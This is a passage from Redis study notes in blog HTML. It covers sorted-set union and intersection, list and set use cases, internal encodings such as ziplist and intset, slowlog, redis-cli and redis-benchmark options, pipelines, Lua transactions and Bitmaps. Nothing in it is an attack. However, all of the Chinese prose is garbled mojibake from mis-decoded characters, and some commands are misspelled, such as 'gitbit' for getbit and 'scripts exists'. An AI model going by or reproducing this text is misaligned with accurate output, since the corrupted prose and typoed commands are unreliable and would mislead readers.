é™¤çš„æˆå‘˜ä¸ªæ•°ï¼Œğ‘›æ˜¯å½“å‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zinterstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max]</code></td><td><code>destination</code>ï¼šäº¤é›†è®¡ç®—ç»“æœä¿å­˜åˆ°è¿™ä¸ªé”®ï¼›<br><code>numkeys</code>ï¼šéœ€è¦åšäº¤é›†è®¡ç®—é”®çš„ä¸ªæ•°ï¼›<br><code>key [key...]</code>ï¼šéœ€è¦åšäº¤é›†è®¡ç®—çš„é”®ï¼›<br><code>weights weight[weight...]</code>ï¼šæ¯ä¸ªé”®çš„æƒé‡ï¼Œåœ¨åšäº¤é›†è®¡ç®—æ—¶ï¼Œæ¯ä¸ªé”®ä¸­çš„æ¯ä¸ª member ä¼šå°†è‡ªå·±åˆ†æ•°ä¹˜ä»¥è¿™ä¸ªæƒé‡ï¼Œæ¯ä¸ªé”®çš„æƒé‡é»˜è®¤æ˜¯1ï¼›<br><code>aggregate sum|min|max</code>ï¼šè®¡ç®—æˆå‘˜äº¤é›†åï¼Œåˆ†å€¼å¯ä»¥æŒ‰ç…§sumï¼ˆå’Œï¼‰ã€minï¼ˆæœ€å°å€¼ï¼‰ã€maxï¼ˆæœ€å¤§å€¼ï¼‰åšæ±‡æ€»ï¼Œé»˜è®¤å€¼æ˜¯sum</td><td></td><td>å–äº¤é›†</td><td>$O(n * k)+O(m*log(m))$ï¼Œğ‘›æ˜¯æˆå‘˜æ•°æœ€å°çš„æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°ï¼Œğ‘˜æ˜¯æœ‰åºé›†åˆçš„ä¸ªæ•°ï¼Œğ‘šæ˜¯ç»“æœé›†ä¸­æˆå‘˜ä¸ªæ•°</td><td></td></tr><tr><td><code>zunionstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max]</code></td><td></td><td></td><td>å–å¹¶é›†</td><td>$O(n)+O(m*log(m))$ï¼Œğ‘›æ˜¯æ‰€æœ‰æœ‰åºé›†åˆæˆå‘˜ä¸ªæ•°å’Œï¼Œğ‘šæ˜¯ç»“æœé›†ä¸­æˆå‘˜ä¸ªæ•°</td><td></td></tr></tbody></table><h2 id="åˆ¤æ–­é”®ä¸å­˜åœ¨çš„æ–¹æ³•"><a href="#åˆ¤æ–­é”®ä¸å­˜åœ¨çš„æ–¹æ³•" class="headerlink" title="åˆ¤æ–­é”®ä¸å­˜åœ¨çš„æ–¹æ³•"></a>åˆ¤æ–­é”®ä¸å­˜åœ¨çš„æ–¹æ³•</h2><ol><li><code>exists</code> è¿”å› 0</li><li><code>del</code> è¿”å› 0</li><li><code>ttl</code> è¿”å› -2</li><li><code>type</code> è¿”å› <code>none</code></li><li><code>get</code> è¿”å› <code>nil</code></li></ol><p>è®¾è®¡åˆç†çš„é”®åï¼Œæœ‰åŠ©äºé˜²æ­¢é”®å†²çªå’Œé¡¹ç›®çš„å¯ç»´æŠ¤æ€§ï¼Œæ¯”è¾ƒæ¨èçš„æ–¹å¼æ˜¯ä½¿ç”¨â€œä¸šåŠ¡å:å¯¹è±¡å:id:[å±æ€§]â€ä½œä¸ºé”®åã€‚å¦‚æœé”®åè¾ƒé•¿ï¼Œå¯ä»¥åœ¨èƒ½æè¿°é”®å«ä¹‰çš„å‰æä¸‹é€‚å½“å‡å°‘é”®çš„é•¿åº¦ï¼Œä»è€Œå‡å°‘ç”±äºé”®åè¿‡é•¿è€Œå¯¼è‡´çš„å†…å­˜æµªè´¹ã€‚</p><h2 id="åˆ—è¡¨çš„å››ç§æ“ä½œç±»å‹"><a href="#åˆ—è¡¨çš„å››ç§æ“ä½œç±»å‹" class="headerlink" title="åˆ—è¡¨çš„å››ç§æ“ä½œç±»å‹"></a>åˆ—è¡¨çš„å››ç§æ“ä½œç±»å‹</h2><table><thead><tr><th>æ“ä½œç±»å‹</th><th>æ“ä½œ</th></tr></thead><tbody><tr><td>æ·»åŠ </td><td><code>rpush</code> <code>lpush</code> <code>linsert</code></td></tr><tr><td>æŸ¥</td><td><code>lrange</code> <code>lindex</code> <code>llen</code></td></tr><tr><td>åˆ é™¤</td><td><code>lpop</code> <code>rpop</code> <code>lrem</code> <code>ltrim</code></td></tr><tr><td>ä¿®æ”¹</td><td><code>lset</code></td></tr><tr><td>é˜»å¡æ“ä½œ</td><td><code>blpop</code> <code>brpop</code></td></tr></tbody></table><h2 id="åˆ—è¡¨çš„ä½¿ç”¨åœºæ™¯"><a href="#åˆ—è¡¨çš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="åˆ—è¡¨çš„ä½¿ç”¨åœºæ™¯"></a>åˆ—è¡¨çš„ä½¿ç”¨åœºæ™¯</h2><ul><li><code>lpush</code> + <code>lpop</code> = Stackï¼ˆæ ˆï¼‰</li><li><code>lpush</code> + <code>rpop</code> = Queueï¼ˆé˜Ÿåˆ—ï¼‰</li><li><code>lpush</code> + <code>ltrim</code> = Capped Collectionï¼ˆæœ‰é™é›†åˆï¼‰</li><li><code>lpush</code> + <code>brpop</code> = Message Queueï¼ˆæ¶ˆæ¯é˜Ÿåˆ—ï¼‰</li></ul><h2 id="é›†åˆçš„ä½¿ç”¨åœºæ™¯"><a href="#é›†åˆçš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="é›†åˆçš„ä½¿ç”¨åœºæ™¯"></a>é›†åˆçš„ä½¿ç”¨åœºæ™¯</h2><ul><li><code>sadd</code> = Taggingï¼ˆæ ‡ç­¾ï¼‰</li><li><code>spop/srandmember</code> = Random itemï¼ˆç”Ÿæˆéšæœºæ•°ï¼Œæ¯”å¦‚æŠ½å¥–ï¼‰</li><li><code>sadd</code> + <code>sinter</code>= Social Graphï¼ˆç¤¾äº¤éœ€æ±‚ï¼‰</li></ul><h2 id="åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆçš„å¼‚åŒç‚¹"><a href="#åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆçš„å¼‚åŒç‚¹" class="headerlink" title="åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆçš„å¼‚åŒç‚¹"></a>åˆ—è¡¨ã€é›†åˆã€æœ‰åºé›†åˆçš„å¼‚åŒç‚¹</h2><table><thead><tr><th>æ•°æ®ç»“æ„</th><th align="center">æ˜¯å¦å…è®¸é‡å¤å…ƒç´ </th><th align="center">æ˜¯å¦æœ‰åº</th><th>æœ‰åºå®ç°æ–¹å¼</th><th>åº”ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>åˆ—è¡¨</td><td align="center">æ˜¯</td><td align="center">æ˜¯</td><td>ç´¢å¼•ä¸‹æ ‡</td><td>æ—¶é—´è½´ã€æ¶ˆæ¯é˜Ÿåˆ—ç­‰</td></tr><tr><td>é›†åˆ</td><td align="center">å¦</td><td align="center">å¦</td><td>æ— </td><td>æ ‡ç­¾ã€ç¤¾äº¤ç­‰</td></tr><tr><td>æœ‰åºé›†åˆ</td><td align="center">å¦</td><td align="center">æ˜¯</td><td>åˆ†å€¼</td><td>æ’è¡Œæ¦œã€ç¤¾äº¤ç­‰</td></tr></tbody></table><h2 id="Redis-æ•°æ®ç»“æ„ä¸å†…éƒ¨ç¼–ç "><a href="#Redis-æ•°æ®ç»“æ„ä¸å†…éƒ¨ç¼–ç " class="headerlink" title="Redis æ•°æ®ç»“æ„ä¸å†…éƒ¨ç¼–ç "></a>Redis æ•°æ®ç»“æ„ä¸å†…éƒ¨ç¼–ç </h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8rmou0bzdj30hx0kb0xe.jpg" alt="Redisæ•°æ®ç»“æ„ä¸å†…éƒ¨ç¼–ç "></p><ul><li>å­—ç¬¦ä¸²<ul><li>int: 8ä¸ªå­—èŠ‚çš„é•¿æ•´å‹</li><li>embstr: &lt;=39 Byte çš„å­—ç¬¦ä¸²</li><li>raw: &gt;39 Byte çš„å­—ç¬¦ä¸²</li></ul></li><li>å“ˆå¸Œ<ul><li>ziplist: å½“å“ˆå¸Œç±»å‹å…ƒç´ ä¸ªæ•°å°äº <code>hash-max-ziplist-entries</code> é…ç½®ï¼ˆé»˜è®¤512ä¸ªï¼‰ã€åŒæ—¶æ‰€æœ‰å€¼éƒ½å°äº <code>hash-max-ziplist-value</code> é…ç½®ï¼ˆé»˜è®¤64å­—èŠ‚ï¼‰æ—¶ï¼ŒRedis ä¼šä½¿ç”¨ ziplist ä½œä¸ºå“ˆå¸Œçš„å†…éƒ¨å®ç°ï¼Œziplist ä½¿ç”¨æ›´åŠ ç´§å‡‘çš„ç»“æ„å®ç°å¤šä¸ªå…ƒç´ çš„è¿ç»­å­˜å‚¨ï¼Œæ‰€ä»¥åœ¨<strong>èŠ‚çœå†…å­˜æ–¹é¢æ¯” hashtable æ›´åŠ ä¼˜ç§€</strong>ã€‚</li><li>hashtable: å½“å“ˆå¸Œç±»å‹æ— æ³•æ»¡è¶³ ziplist çš„æ¡ä»¶æ—¶ï¼ŒRedis ä¼šä½¿ç”¨ hashtable ä½œä¸ºå“ˆå¸Œçš„å†…éƒ¨å®ç°ï¼Œå› ä¸ºæ­¤æ—¶ ziplist çš„è¯»å†™æ•ˆç‡ä¼šä¸‹é™ï¼Œè€Œ hashtable çš„è¯»å†™æ—¶é—´å¤æ‚åº¦ä¸º$O(1)$</li></ul></li><li>åˆ—è¡¨<ul><li>ziplist: å½“åˆ—è¡¨å…ƒç´ ä¸ªæ•°å°äº <code>list-max-ziplist-entries</code> é…ç½®ï¼ˆé»˜è®¤512ä¸ªï¼‰ã€åŒæ—¶æ¯ä¸ªå…ƒç´ å€¼éƒ½å°äº <code>list-max-ziplist-value</code> é…ç½®ï¼ˆé»˜è®¤64å­—èŠ‚ï¼‰æ—¶ï¼ŒRedis ä¼šä½¿ç”¨ ziplist æ¥ä½œä¸ºåˆ—è¡¨çš„å†…éƒ¨å®ç°æ¥å‡å°‘å†…å­˜</li><li>linkedlist: å½“æ— æ³•æ»¡è¶³ziplistæ¡ä»¶æ—¶</li></ul></li><li>é›†åˆ<ul><li>intset: å½“é›†åˆä¸­çš„å…ƒç´ éƒ½æ˜¯æ•´æ•°ä¸”å…ƒç´ ä¸ªæ•°å°äº<code>set-maxintset-entries</code>é…ç½®ï¼ˆé»˜è®¤512ä¸ªï¼‰æ—¶ï¼ŒRedisä¼šé€‰ç”¨intsetæ¥ä½œä¸ºé›†åˆçš„å†…éƒ¨å®ç°ï¼Œä»è€Œå‡å°‘å†…å­˜çš„ä½¿ç”¨ã€‚</li><li>hashtable: æ— æ³•æ»¡è¶³intsetæ—¶</li></ul></li><li>æœ‰åºé›†åˆ<ul><li>ziplist: å½“æœ‰åºé›†åˆçš„å…ƒç´ ä¸ªæ•°å°äº<code>zset-max-ziplistentries</code>é…ç½®ï¼ˆé»˜è®¤128ä¸ªï¼‰ï¼ŒåŒæ—¶æ¯ä¸ªå…ƒç´ çš„å€¼éƒ½å°äº<code>zset-max-ziplist-value</code>é…ç½®ï¼ˆé»˜è®¤64å­—èŠ‚ï¼‰æ—¶ï¼ŒRedisä¼šç”¨ziplistæ¥ä½œä¸ºæœ‰åºé›†åˆçš„å†…éƒ¨å®ç°æ¥å‡å°‘å†…å­˜</li><li>skiplist: å½“æ— æ³•æ»¡è¶³ziplistæ¡ä»¶æ—¶</li></ul></li></ul><p>Redis è®¾è®¡å†…éƒ¨ç¼–ç ä¸å¤–éƒ¨ç»“æ„æœ‰ä¸¤ä¸ªå¥½å¤„</p><ol><li>æ”¹è¿›å†…éƒ¨ç¼–ç è€Œå¯¹å¤–éƒ¨æ•°æ®ç»“æ„å’Œå‘½ä»¤æ²¡æœ‰å½±å“</li><li>å¤šç§å†…éƒ¨ç¼–ç å®ç°å¯ä»¥åœ¨ä¸åŒåœºæ™¯ä¸‹å‘æŒ¥å„è‡ªçš„ä¼˜åŠ¿ï¼Œå¦‚ ziplist æ¯”è¾ƒèŠ‚çœå†…å­˜ï¼Œä½†åœ¨åˆ—è¡¨å…ƒç´ è¾ƒå¤šçš„æƒ…å†µä¸‹ï¼Œæ€§èƒ½ä¼šæœ‰æ‰€ä¸‹é™ï¼Œæ­¤æ—¶ Redis ä¼šæ ¹æ®é…ç½®é€‰é¡¹å°†åˆ—è¡¨ç±»å‹çš„å†…éƒ¨å®ç°è½¬æ¢ä¸º linkedlistã€‚</li></ol><p>å¯ä»¥é€šè¿‡<code>object encoding key</code>å‘½ä»¤æŸ¥è¯¢å†…éƒ¨ç¼–ç ã€‚</p><h1 id="ç¬¬-3-ç« -å°åŠŸèƒ½å¤§ç”¨å¤„"><a href="#ç¬¬-3-ç« -å°åŠŸèƒ½å¤§ç”¨å¤„" class="headerlink" title="ç¬¬ 3 ç«  å°åŠŸèƒ½å¤§ç”¨å¤„"></a>ç¬¬ 3 ç«  å°åŠŸèƒ½å¤§ç”¨å¤„</h1><h2 id="æ…¢æŸ¥è¯¢"><a href="#æ…¢æŸ¥è¯¢" class="headerlink" title="æ…¢æŸ¥è¯¢"></a>æ…¢æŸ¥è¯¢</h2><h3 id="æ…¢æŸ¥è¯¢é…ç½®"><a href="#æ…¢æŸ¥è¯¢é…ç½®" class="headerlink" title="æ…¢æŸ¥è¯¢é…ç½®"></a>æ…¢æŸ¥è¯¢é…ç½®</h3><ul><li><code>slowlog-log-slower-than</code> æ‰§è¡Œæ—¶é—´é˜ˆå€¼<ul><li>å•ä½ä¸ºå¾®ç§’ï¼Œé»˜è®¤ 10,000ï¼Œä¸º 0 è¡¨ç¤ºè®°å½•æ‰€æœ‰å‘½ä»¤ï¼Œ&lt;0 ä¸è®°å½•ä»»ä½•å‘½ä»¤</li><li>åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œéœ€è¦å°†è¯¥å€¼å‘ä¸‹è°ƒæ•´</li></ul></li><li><code>slowlog-max-len</code><ul><li>Redis ä½¿ç”¨åˆ—è¡¨ç»“æ„å­˜å‚¨æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œè¯¥å‚æ•°ä¸ºåˆ—è¡¨æœ€å¤§é•¿åº¦</li><li>å½“åˆ—è¡¨è¾¾æœ€å¤§é•¿åº¦æ—¶ï¼Œæœ€æ—©æ’å…¥çš„å‘½ä»¤ä¼šè¢«ä»åˆ—è¡¨ä¸­ç§»å‡º</li><li>å¯å®šæ—¶å°†æ…¢æŸ¥è¯¢æ—¥å¿—æŒä¹…åŒ–å¤„ç†ï¼Œä¾¿äºæ’æŸ¥æ•…éšœ</li></ul></li></ul><h3 id="æ…¢æŸ¥è¯¢å‘½ä»¤"><a href="#æ…¢æŸ¥è¯¢å‘½ä»¤" class="headerlink" title="æ…¢æŸ¥è¯¢å‘½ä»¤"></a>æ…¢æŸ¥è¯¢å‘½ä»¤</h3><table><thead><tr><th>å‘½ä»¤</th><th>é€‰é¡¹</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>slowlog get [n]</code></td><td><code>n</code>: æŒ‡å®šæ¡æ•°</td><td></td></tr><tr><td><code>slowlog len</code></td><td></td><td>è·å–å½“å‰æ…¢æŸ¥è¯¢åˆ—è¡¨é•¿åº¦</td></tr><tr><td><code>slowlog reset</code></td><td></td><td>é‡ç½®æ—¥å¿—ï¼Œå³æ¸…ç†æ…¢æŸ¥è¯¢åˆ—è¡¨</td></tr></tbody></table><h3 id="æ…¢æŸ¥è¯¢æ—¥å¿—ç»“æ„"><a href="#æ…¢æŸ¥è¯¢æ—¥å¿—ç»“æ„" class="headerlink" title="æ…¢æŸ¥è¯¢æ—¥å¿—ç»“æ„"></a>æ…¢æŸ¥è¯¢æ—¥å¿—ç»“æ„</h3><p>ç”± 4 ä¸ªå±æ€§ç»„æˆ</p><ol><li>æ—¥å¿—æ ‡è¯† ID</li><li>æ—¶é—´æˆ³</li><li>å‘½ä»¤è€—æ—¶</li><li>æ‰§è¡Œå‘½ä»¤å’Œå‚æ•°<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; slowlog get</span><br><span class="line">1) 1) (integer) 666</span><br><span class="line">   2) (integer) 1456786500</span><br><span class="line">   3) (integer) 11615</span><br><span class="line">   4) 1) &quot;BGREWRITEAOF&quot;</span><br><span class="line">2) 1) (integer) 665</span><br><span class="line">   2) (integer) 1456718400</span><br><span class="line">   3) (integer) 12006</span><br><span class="line">   4) 1) &quot;SETEX&quot;</span><br><span class="line">      2) &quot;video_info_200&quot;</span><br><span class="line">      3) &quot;300&quot;</span><br><span class="line">      4) &quot;2&quot;</span><br></pre></td></tr></table></figure></li></ol><h2 id="Redis-Shell"><a href="#Redis-Shell" class="headerlink" title="Redis Shell"></a>Redis Shell</h2><h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a><code>redis-cli</code></h3><table><thead><tr><th>ç¤ºä¾‹</th><th>é€‰é¡¹</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>redis-cli -r 3 ping</code></td><td><code>-r</code>(repeat)ï¼šæŒ‡å®šå‘½ä»¤æ‰§è¡Œæ¬¡æ•°</td><td></td></tr><tr><td><code>redis-cli -r 5 -i 1 ping</code></td><td><code>-i</code>(interval)ï¼šæ‰§è¡Œå‘½ä»¤é—´éš”æ—¶é—´ï¼Œå•ä½ç§’</td><td><code>-i</code>å¿…é¡»ä¸<code>-r</code>ä¸€åŒä½¿ç”¨<br>è¯¥é€‰é¡¹ä¸æ”¯æŒæ¯«ç§’ä¸ºå•ä½ï¼Œè‹¥æƒ³ä»¥ 10ms ä¸ºé—´éš”ï¼Œå¯ä»¥ä½¿ç”¨<code>-i 0.01</code></td></tr><tr><td><code>echo &quot;world&quot; | redis-cli -x set hello</code></td><td><code>-x</code>: ä» stdin è¯»å–æ•°æ®ä½œä¸º <code>redis-cli</code>çš„æœ€åä¸€ä¸ªå‚æ•°</td><td></td></tr><tr><td></td><td><code>-c</code>(cluster): è¿æ¥ Redis cluster æ—¶ä½¿ç”¨ï¼Œå¯ä»¥é˜²æ­¢ <code>moved</code> å’Œ <code>ask</code> å¼‚å¸¸</td><td></td></tr><tr><td></td><td><code>-a</code>(auth): å¯†ç è®¤è¯</td><td></td></tr><tr><td><code>redis-cli --scan --pattern &quot;app*&quot;</code></td><td><code>--scan</code> &amp; <code>--pattern</code>: äºæ‰«ææŒ‡å®šæ¨¡å¼çš„é”®</td><td></td></tr><tr><td><code>redis-cli --slave</code></td><td><code>--slave</code>é€‰é¡¹æ˜¯æŠŠå½“å‰å®¢æˆ·ç«¯æ¨¡æ‹Ÿæˆå½“å‰ Redis èŠ‚ç‚¹çš„ä»èŠ‚ç‚¹ï¼Œå¯ä»¥ç”¨æ¥è·å–å½“å‰ Redis èŠ‚ç‚¹çš„æ›´æ–°æ“ä½œ</td><td></td></tr><tr><td></td><td><code>--rdb</code>: å°† Redis å®ä¾‹æŒä¹…åŒ–</td><td></td></tr><tr><td></td><td><code>--pipe</code>: å°†å‘½ä»¤å°è£…æˆRedisé€šä¿¡åè®®å®šä¹‰çš„æ•°æ®æ ¼å¼ï¼Œæ‰¹é‡å‘é€ç»™Redisæ‰§è¡Œ</td><td></td></tr><tr><td><code>redis-cli --bigkeys</code></td><td><code>--bigkeys</code>: ä½¿ç”¨scanå‘½ä»¤å¯¹Redisçš„é”®è¿›è¡Œé‡‡æ ·ï¼Œä»ä¸­æ‰¾åˆ°å†…å­˜å ç”¨æ¯”è¾ƒå¤§çš„é”®å€¼ï¼Œè¿™äº›é”®å¯èƒ½æ˜¯ç³»ç»Ÿçš„ç“¶é¢ˆ</td><td></td></tr><tr><td></td><td><code>--eval</code>: æŒ‡å®š Lua è„šæœ¬</td><td></td></tr><tr><td><code>redis-cli -h {machineB} --latency</code><br><code>redis-cli -h {machineB} --latency-history</code><br><code>redis-cli -h {machineB} --latency-dist</code></td><td><code>--latency</code>: æµ‹è¯•ç›®æ ‡ Redis ç½‘ç»œå»¶æ—¶ã€‚ä»…è¿”å›ä¸€æ¡ç»“æœ<br><code>--latency-history</code>: æ¯é—´éš”ä¸€å®šæ—¶é—´ï¼ˆå¯é€šè¿‡<code>-i</code>è®¾å®šï¼‰è¿”å›ç»“æœ<br><code>--latency-dist</code>: ä»¥ç»Ÿè®¡å›¾è¡¨çš„æ–¹å¼è¾“å‡ºç»Ÿè®¡ä¿¡æ¯</td><td></td></tr><tr><td><code>redis-cli --stat</code></td><td><code>--stat</code>: å®æ—¶è·å– Redis ç»Ÿè®¡ä¿¡æ¯</td><td><code>redis-cli info</code>ä¹Ÿèƒ½æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</td></tr><tr><td><code>redis-cli --no-raw get apple</code></td><td><code>--raw</code> &amp; <code>--no-raw</code>: æ˜¯å¦æ ¼å¼åŒ–è¾“å‡º</td><td></td></tr></tbody></table><h3 id="redis-server"><a href="#redis-server" class="headerlink" title="redis-server"></a><code>redis-server</code></h3><p><code>redis-server --test-memory 1024</code> å¯ç”¨äºæ£€æµ‹å½“å‰ OS æ˜¯å¦èƒ½ç¨³å®šåˆ†é…æŒ‡å®šå®¹é‡å†…å­˜ç»™ Redisï¼Œè¯¥å‘½ä»¤é€šå¸¸ç”¨äºå‹æµ‹ã€‚</p><h3 id="redis-benchmark"><a href="#redis-benchmark" class="headerlink" title="redis-benchmark"></a><code>redis-benchmark</code></h3><p>è¯¥å‘½ä»¤ä¼šå¯¹å„ç±»æ•°æ®ç»“æ„çš„å‘½ä»¤è¿›è¡Œæµ‹è¯•ï¼Œå¹¶ç»™å‡ºæ€§èƒ½æŒ‡æ ‡ã€‚</p><ul><li><code>-c</code>(client) å¯æŒ‡å®šå®¢æˆ·ç«¯å¹¶å‘æ•°ï¼ˆé»˜è®¤ 50ï¼‰</li><li><code>-n</code> æŒ‡å®šå®¢æˆ·ç«¯è¯·æ±‚æ€»é‡ï¼ˆé»˜è®¤ 100,000ï¼‰</li><li><code>-q</code> ä»…æ˜¾ç¤ºæ¯ç§’æ¥æ”¶è¯·æ±‚æ•°</li><li><code>-r</code>(random) éšæœºæ’å…¥é”®ï¼Œä»¥è¿›è¡ŒåŸºå‡†æµ‹è¯•</li><li><code>-P</code> æ¯ä¸ªè¯·æ±‚ pipeline çš„æ•°æ®é‡ï¼ˆé»˜è®¤ä¸º 1ï¼‰</li><li><code>-k</code> å®¢æˆ·ç«¯æ˜¯å¦ä½¿ç”¨<code>keepalive</code>ï¼Œ1 ä¸ºä½¿ç”¨ï¼Œ0 ä¸ºä¸ä½¿ç”¨ï¼Œé»˜è®¤ä¸º 1</li><li><code>-t</code> å¯¹æŒ‡å®šå‘½ä»¤è¿›è¡ŒåŸºå‡†æµ‹è¯•ï¼Œå¦‚<code>redis-benchmark -t get,set -q</code></li><li><code>--csv</code> å°†ç»“æœæŒ‰ç…§ csv æ ¼å¼è¾“å‡º</li></ul><h2 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h2><p>ç”±äº Redis æ˜¯å•çº¿ç¨‹æœºåˆ¶ï¼Œå½“éœ€è¦æ‰§è¡Œå¤šæ¡å‘½ä»¤æ—¶ï¼Œç½‘ç»œ I/O æˆä¸ºäº†ç“¶é¢ˆï¼Œå› æ­¤ pipeline å¯å°†å¾…æ‰§è¡Œå‘½ä»¤â€œæ‰“åŒ…â€ï¼Œé€šè¿‡ä¸€æ¬¡å¾€è¿”å³å¯å®Œæˆã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœ pipeline æ•°æ®é‡è¿‡å¤§ï¼Œå°†ä¼šå¯¼è‡´ç½‘ç»œé˜»å¡ã€‚</p><h2 id="äº‹åŠ¡ä¸-Lua"><a href="#äº‹åŠ¡ä¸-Lua" class="headerlink" title="äº‹åŠ¡ä¸ Lua"></a>äº‹åŠ¡ä¸ Lua</h2><p>Redis ä¸­ï¼Œå°†ä¸€ç»„éœ€è¦ä¸€èµ·æ‰§è¡Œçš„äº‹åŠ¡å‘½ä»¤æ”¾åˆ°<code>multi</code>(å¼€å§‹)å’Œ<code>exec</code>(ç»“æŸ)ä¹‹é—´å³å¯ï¼Œå¦‚æœè¦åœæ­¢äº‹åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨<code>discard</code>ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒRedis ä¸æ”¯æŒäº‹åŠ¡çš„å›æ»šæ“ä½œï¼Œä½†å¯ä»¥é€šè¿‡ Lua æ¥å®ç°å›æ»šã€‚</p><p>æœ‰äº›åº”ç”¨åœºæ™¯éœ€è¦åœ¨äº‹åŠ¡ä¹‹å‰ï¼Œç¡®ä¿äº‹åŠ¡ä¸­çš„<code>key</code>æ²¡æœ‰è¢«å…¶ä»–å®¢æˆ·ç«¯ä¿®æ”¹è¿‡ï¼Œæ‰æ‰§è¡Œäº‹åŠ¡ï¼Œå¦åˆ™ä¸æ‰§è¡Œï¼ˆç±»ä¼¼ä¹è§‚é”ï¼‰ã€‚Redisæä¾›äº†<code>watch</code>å‘½ä»¤æ¥è§£å†³è¿™ç±»é—®é¢˜ã€‚</p><p>Lua çš„æ•°æ®ç±»å‹ï¼š</p><ol><li>booleans(å¸ƒå°”)</li><li>numbers(æ•°å€¼)</li><li>strings(å­—ç¬¦ä¸²)</li><li>tables(è¡¨æ ¼)</li></ol><h3 id="åœ¨-Redis-ä¸­æ‰§è¡Œ-Lua-çš„æ–¹æ³•"><a href="#åœ¨-Redis-ä¸­æ‰§è¡Œ-Lua-çš„æ–¹æ³•" class="headerlink" title="åœ¨ Redis ä¸­æ‰§è¡Œ Lua çš„æ–¹æ³•"></a>åœ¨ Redis ä¸­æ‰§è¡Œ Lua çš„æ–¹æ³•</h3><p>æ–¹å¼ä¸€<br><code>eval è„šæœ¬å†…å®¹ keyä¸ªæ•° keyåˆ—è¡¨ å‚æ•°åˆ—è¡¨</code></p><p>æ–¹å¼äºŒ<br>å…ˆå°† Lua è„šæœ¬åŠ è½½å…¥ Redisï¼Œå¾—åˆ°è¯¥è„šæœ¬çš„ SHA1ï¼Œ<code>evalsha</code>ä½¿ç”¨<code>SHA1</code>æ‰§è¡Œå¯¹åº”çš„è„šæœ¬ã€‚è¿™æ ·å¯ä»¥é‡å¤æ‰¹å¤„ç†ã€‚</p><ul><li>åŠ è½½è„šæœ¬ï¼š<code>redis-cli script load &quot;$(cat lua_get.lua)&quot;</code></li><li>æ‰§è¡Œè„šæœ¬ï¼š<code>evalsha è„šæœ¬SHA1å€¼ keyä¸ªæ•° keyåˆ—è¡¨ å‚æ•°åˆ—è¡¨</code></li><li>åˆ¤æ–­è„šæœ¬æ˜¯å¦å·²ç»è¢«åŠ è½½ï¼š<code>scripts exists sha1 [sha1 â€¦]</code>ï¼Œè¿”å›å­˜åœ¨çš„è„šæœ¬ä¸ªæ•°</li><li>æ¸…é™¤æ‰€æœ‰è„šæœ¬ï¼š<code>script flush</code></li><li>å¼ºåˆ¶ç»ˆæ­¢è„šæœ¬ï¼š<code>script kill</code>ã€‚å¦‚æœå½“å‰è„šæœ¬æ­£åœ¨å†™å…¥ï¼Œåˆ™è¯¥å‘½ä»¤ä¸ä¼šç”Ÿæ•ˆï¼Œæ­¤æ—¶è¦ä¹ˆç­‰å¾…è„šæœ¬æ‰§è¡Œç»“æŸï¼Œè¦ä¹ˆä½¿ç”¨<code>shutdown save</code>åœæ­¢ Redis æœåŠ¡</li></ul><blockquote><p>Lua è„šæœ¬åœ¨ Redis ä¸­æ˜¯åŸå­æ‰§è¡Œçš„ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šæ’å…¥å…¶å®ƒå‘½ä»¤ã€‚</p></blockquote><h2 id="Bitmaps"><a href="#Bitmaps" class="headerlink" title="Bitmaps"></a>Bitmaps</h2><p>Bitmapsæœ¬èº«ä¸æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®é™…ä¸Šå®ƒå°±æ˜¯å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å®ƒå¯ä»¥å¯¹å­—ç¬¦ä¸²çš„ä½è¿›è¡Œæ“ä½œã€‚</p><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><code>setbit key offset value</code></td><td>è®¾ç½®å€¼</td><td>å¾ˆå¤šåº”ç”¨çš„ç”¨æˆ·idä»¥ä¸€ä¸ªæŒ‡å®šæ•°å­—ï¼ˆä¾‹å¦‚10000ï¼‰å¼€å¤´ï¼Œç›´æ¥å°†ç”¨æˆ·idå’ŒBitmapsçš„åç§»é‡å¯¹åº”åŠ¿å¿…ä¼šé€ æˆä¸€å®šçš„æµªè´¹ï¼Œé€šå¸¸çš„åšæ³•æ˜¯æ¯æ¬¡åš <code>setbit</code> æ“ä½œæ—¶å°†ç”¨æˆ·idå‡å»è¿™ä¸ªæŒ‡å®šæ•°å­—ã€‚åœ¨ç¬¬ä¸€æ¬¡åˆå§‹åŒ– Bitmaps æ—¶ï¼Œå‡å¦‚åç§»é‡éå¸¸å¤§ï¼Œé‚£ä¹ˆæ•´ä¸ªåˆå§‹åŒ–è¿‡ç¨‹æ‰§è¡Œä¼šæ¯”è¾ƒæ…¢ï¼Œå¯èƒ½ä¼šé€ æˆRedisçš„é˜»å¡</td></tr><tr><td><code>gitbit key offset</code></td><td>è·å–å€¼</td><td></td></tr><tr><td><code>bitcount 